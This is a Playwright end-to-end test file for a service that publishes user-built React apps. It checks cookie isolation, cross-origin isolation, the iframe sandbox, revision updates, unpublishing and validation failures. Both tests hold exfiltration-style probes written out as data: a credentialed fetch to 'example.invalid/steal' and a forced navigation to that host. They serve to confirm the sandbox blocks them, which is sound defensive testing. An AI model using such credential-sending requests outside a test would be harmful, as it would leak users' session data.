import { test, expect, type Page } from '@playwright/test'
import { IncomingMessage, ServerResponse } from 'node:http'
import { Duplex } from 'node:stream'
import type { Socket } from 'node:net'
import { mkdtemp, rm, readFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createService } from '../server/service'
import { mockStudioSession } from './studio-session'

async function setup(page: Page) {
  const root = await mkdtemp(join(tmpdir(), 'paper-source-export-e2e-'))
  const service = await createService({ root, secret: 'assets-browser-test-secret-at-least-32-characters', origin: 'http://127.0.0.1:4173', releaseOrigin: 'http://localhost:4180' })
  const { user, session } = await service.auth.login('github', { sub: 'asset-browser', email: 'assets@paper.test', name: 'Designer', avatar: '' })
  const responses: ServerResponse[] = []
  // Route built frontend files in-process: the restricted runner cannot bind sockets.
  await page.route('http://127.0.0.1:4173/**', async route => {
    const pathname = new URL(route.request().url()).pathname
    if (pathname.startsWith('/api/')) { await route.fallback(); return }
    const file = new URL(`../dist${pathname === '/' ? '/index.html' : pathname}`, import.meta.url)
    const contentType = pathname.endsWith('.js') ? 'text/javascript' : pathname.endsWith('.css') ? 'text/css' : pathname.endsWith('.json') ? 'application/json' : 'text/html'
    await route.fulfill({ contentType, body: await readFile(file) })
  })
  await mockStudioSession(page)
  await page.route('**/api/auth/session', route => route.fulfill({ json: { user: service.auth.profile(user), providers: { google: true, github: true } } }))
  await page.route(/\/api\/apps(?:\/|$)|\/api\/model\//, async route => {
    const socket = new Duplex({ read() {}, write(_chunk, _encoding, callback) { callback() } }) as Socket
    const req = new IncomingMessage(socket)
    const u = new URL(route.request().url())
    req.url = u.pathname + u.search
    req.method = route.request().method()
    req.headers = { ...route.request().headers(), cookie: `paper_session=${session}` }
    const res = new ServerResponse(req)
    res.assignSocket(socket); responses.push(res)
    const chunks: Buffer[] = []
    const origWrite = res.write.bind(res)
    res.write = ((chunk: unknown, encoding?: unknown, callback?: unknown) => {
      if (chunk) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)))
      return origWrite(chunk as never, encoding as never, callback as never)
    }) as typeof res.write
    const origEnd = res.end.bind(res)
    res.end = ((chunk?: unknown, encoding?: unknown, callback?: unknown) => {
      if (chunk) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)))
      return origEnd(chunk as never, encoding as never, callback as never)
    }) as typeof res.end
    await service.handler(req, res, route.request().postData() ?? '{}')
    const headers: Record<string, string> = {}
    if ((res as unknown as { _header?: string })._header) {
      for (const line of (res as unknown as { _header: string })._header.split('\r\n').slice(1)) {
        const split = line.indexOf(':')
        if (split > 0) headers[line.slice(0, split).toLowerCase()] = line.slice(split + 1).trim()
      }
    }
    for (const [k, v] of Object.entries(res.getHeaders())) {
      if (v !== undefined) headers[k.toLowerCase()] = String(v)
    }
    await route.fulfill({ status: res.statusCode, headers, body: Buffer.concat(chunks) })
  })
  await page.goto('/')
  await page.getByRole('button', { name: 'Make workspace', exact: true }).click()
  return { service, user, session, async close() {
    service.close(); for (const res of responses) res.emit('close')
    await rm(root, { recursive: true, force: true })
  } }
}

// Real compiler and browser validator. No success fixtures or live production app.
test('publishes a functional public app without editor credentials, updates and unpublishes', async ({ page, browser }) => {
  test.setTimeout(90_000)
  const f = await setup(page)
  const context = await browser.newContext({ serviceWorkers: 'block' })
  const publicPage = await context.newPage()
  try {
    const panel = page.getByRole('region', { name: 'Publication', exact: true })
    await expect(panel.getByRole('button', { name: 'Publish saved app' })).toBeDisabled()
    await page.getByRole('button', { name: 'New app', exact: true }).click()
    await page.getByRole('button', { name: 'Save a copy', exact: true }).click()
    await expect(page.getByText('Saved to your account', { exact: true })).toBeVisible()
    const id = await page.getByRole('combobox', { name: 'Make project' }).inputValue()
    const initial = await f.service.storage.apps.read(f.user.id, id)
    const source = `import {useState} from 'react'; export default function App(){const[n,setN]=useState(0);return <main><h1>Public app</h1><button onClick={()=>setN(n+1)}>Count {n}</button></main>}`
    await f.service.storage.apps.put(f.user.id, id, { ...initial!, files: { 'src/App.tsx': { path: 'src/App.tsx', content: source } } }, 1)
    const reopen = async () => {
      await page.reload()
      await page.getByRole('button', { name: 'Make workspace', exact: true }).click()
      await page.getByRole('combobox', { name: 'Make project' }).selectOption(id)
    }
    await reopen()
    await panel.getByRole('button', { name: 'Publish saved app' }).click()
    const link = panel.getByRole('link', { name: /Open published app/ })
    await expect(link).toBeVisible({ timeout: 25000 })
    const firstUrl = (await link.getAttribute('href'))!
    expect(new URL(firstUrl).origin).toBe('http://localhost:4180')
    const publicCookies: string[] = []
    await publicPage.route('http://localhost:4180/**', async route => {
      // headers() omits security headers such as Cookie; inspect the actual wire
      // headers so this assertion can detect a credential leak.
      publicCookies.push((await route.request().allHeaders()).cookie ?? '')
      const socket = new Duplex({ read() {}, write(_chunk, _encoding, callback) { callback() } }) as Socket
      const req = new IncomingMessage(socket)
      req.url = new URL(route.request().url()).pathname
      req.method = route.request().method(); req.headers = { ...route.request().headers(), host: 'localhost:4180' }
      const res = new ServerResponse(req); res.assignSocket(socket)
      let bytes = Buffer.alloc(0)
      res.end = ((chunk?: unknown) => { if (chunk) bytes = Buffer.from(String(chunk)); return res }) as typeof res.end
      await f.service.publicHandler(req, res)
      const headers: Record<string, string> = {}
      for (const line of (res as unknown as { _header: string })._header.split('\r\n').slice(1)) {
        const i = line.indexOf(':'); if (i > 0) headers[line.slice(0, i).toLowerCase()] = line.slice(i + 1).trim()
      }
      await route.fulfill({ status: res.statusCode, headers, body: bytes })
      res.emit('close')
    })
    // Even a signed-in editor context must never send a Paper cookie to this host.
    await context.addCookies([{ name: 'paper_session', value: f.session, domain: '127.0.0.1', path: '/' }])
    const response = await publicPage.goto(firstUrl)
    expect(response!.status()).toBe(200)
    expect(response!.headers()['cross-origin-opener-policy']).toBe('same-origin')
    expect(response!.headers()['cross-origin-embedder-policy']).toBe('require-corp')
    expect(publicPage.url()).toBe(firstUrl)
    await expect(publicPage).toHaveTitle('Paper app')
    expect(await publicPage.evaluate(() => crossOriginIsolated)).toBe(true)
    const guest = publicPage.frameLocator('iframe')
    await expect(guest.getByRole('heading', { name: 'Public app' })).toBeVisible()
    await guest.getByRole('button', { name: 'Count 0' }).click()
    await expect(guest.getByRole('button', { name: 'Count 1' })).toBeVisible()
    expect(await guest.locator('body').evaluate(() => {
      let cookie = false, storage = false, parent = false
      try { cookie = document.cookie.includes('paper_session') } catch { /* opaque */ }
      try { localStorage.setItem('probe', 'x'); storage = true } catch { /* opaque */ }
      try { parent = !!window.parent.document.body } catch { /* cross origin */ }
      return { cookie, storage, parent }
    })).toEqual({ cookie: false, storage: false, parent: false })
    const escapedRequests: string[] = []
    publicPage.on('request', request => {
      if (request.url().includes('example.invalid')) escapedRequests.push(request.url())
    })
    expect(await guest.locator('body').evaluate(async () => {
      try { await fetch('https://example.invalid/steal', { credentials: 'include' }); return true }
      catch { return false }
    })).toBe(false)
    await guest.locator('body').evaluate(() => {
      location.href = 'https://example.invalid/navigate'
    })
    await expect(guest.getByRole('button', { name: 'Count 1' })).toBeVisible()
    expect(escapedRequests).toEqual([])
    expect(publicCookies.every(cookie => !cookie.includes('paper_session'))).toBe(true)
    const head = (await f.service.storage.apps.read(f.user.id, id))!
    await f.service.storage.apps.put(f.user.id, id, { ...head, files: { 'src/App.tsx': { path: 'src/App.tsx', content: source.replace('Public app', 'Updated app') } } }, 2)
    await reopen()
    await expect(panel).toContainText('Revision 2 is public')
    await panel.getByRole('button', { name: 'Update to revision 3' }).click()
    await expect(panel).toContainText('Revision 3 is public', { timeout: 25000 })
    const updatedUrl = (await link.getAttribute('href'))!
    expect(updatedUrl).not.toBe(firstUrl)
    await publicPage.goto(firstUrl)
    await expect(guest.getByRole('heading', { name: 'Public app' })).toBeVisible()
    await publicPage.goto(updatedUrl)
    await expect(guest.getByRole('heading', { name: 'Updated app' })).toBeVisible()
    await panel.getByRole('button', { name: 'Unpublish app' }).click()
    await expect(link).toHaveCount(0)
    expect((await publicPage.goto(firstUrl))!.status()).toBe(404)
    expect((await publicPage.goto(updatedUrl))!.status()).toBe(404)
  } finally { await context.close(); await f.close() }
})

test('runtime errors and hostile network access never become a live release', async ({ page }) => {
  test.setTimeout(60_000)
  const f = await setup(page)
  try {
    await page.getByRole('button', { name: 'New app', exact: true }).click()
    await page.getByRole('button', { name: 'Save a copy', exact: true }).click()
    await expect(page.getByText('Saved to your account', { exact: true })).toBeVisible()
    const id = await page.getByRole('combobox', { name: 'Make project' }).inputValue()
    for (const content of ['export default function App(){throw new Error("release crash")}', 'fetch("https://example.invalid/steal"); export default () => <main>Denied</main>']) {
      const head = (await f.service.storage.apps.read(f.user.id, id))!
      await f.service.storage.apps.put(f.user.id, id, { ...head, files: { 'src/App.tsx': { path: 'src/App.tsx', content } } }, head.revision)
      await page.reload()
      await page.getByRole('button', { name: 'Make workspace', exact: true }).click()
      await page.getByRole('combobox', { name: 'Make project' }).selectOption(id)
      const panel = page.getByRole('region', { name: 'Publication', exact: true })
      await panel.getByRole('button', { name: 'Publish saved app' }).click()
      await expect(panel.getByRole('alert')).toContainText('validation failed', { timeout: 25000 })
      await expect(panel.getByRole('link')).toHaveCount(0)
      expect(await f.service.storage.apps.publication(f.user.id, id)).toBeNull()
    }
  } finally { await f.close() }
})
